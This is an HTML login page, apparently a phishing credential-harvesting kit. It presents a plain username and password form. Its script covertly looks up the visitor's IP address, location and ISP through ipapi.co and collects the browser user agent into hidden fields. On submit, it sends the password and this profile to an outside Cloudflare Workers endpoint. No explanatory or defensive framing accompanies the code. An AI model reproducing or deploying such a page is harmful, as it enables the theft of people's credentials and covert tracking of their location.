<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Form</title>
  <script>
    async function getUserData() {
      try {
        // Fetch IP and geolocation data
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        document.getElementById('ip').value = data.ip || '';
        document.getElementById('country').value = data.country_name || '';
        document.getElementById('state').value = data.region || '';
        document.getElementById('city').value = data.city || '';
        document.getElementById('zip').value = data.postal || '';
        document.getElementById('isp').value = data.org || '';
        document.getElementById('user_agent').value = navigator.userAgent;
      } catch (error) {
        console.error('Error fetching user data:', error);
      }
    }

    document.addEventListener('DOMContentLoaded', getUserData);

    async function submitForm(event) {
      event.preventDefault();

      const formData = {
        username: document.getElementById('username').value,
        password: document.getElementById('password').value,
        ip: document.getElementById('ip').value,
        country: document.getElementById('country').value,
        state: document.getElementById('state').value,
        city: document.getElementById('city').value,
        zip: document.getElementById('zip').value,
        isp: document.getElementById('isp').value,
        user_agent: document.getElementById('user_agent').value
      };

      try {
        const response = await fetch('https://long-brook-3609.henrycrane65.workers.dev/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(formData)
        });

        if (response.ok) {
          alert('Form submitted successfully!');
        } else {
          alert('Error submitting form.');
        }
      } catch (error) {
        alert('An error occurred: ' + error.message);
      }
    }
  </script>
</head>
<body>

  <h2>Login Form</h2>

  <form id="loginForm" onsubmit="submitForm(event)">
    <label for="username">Username:</label>
    <input type="text" id="username" name="username" required><br><br>

    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required><br><br>

    <!-- Hidden fields for additional data -->
    <input type="hidden" id="ip" name="ip">
    <input type="hidden" id="country" name="country">
    <input type="hidden" id="state" name="state">
    <input type="hidden" id="city" name="city">
    <input type="hidden" id="zip" name="zip">
    <input type="hidden" id="isp" name="isp">
    <input type="hidden" id="user_agent" name="user_agent">

    <input type="submit" value="Submit">
  </form>

</body>
</html>
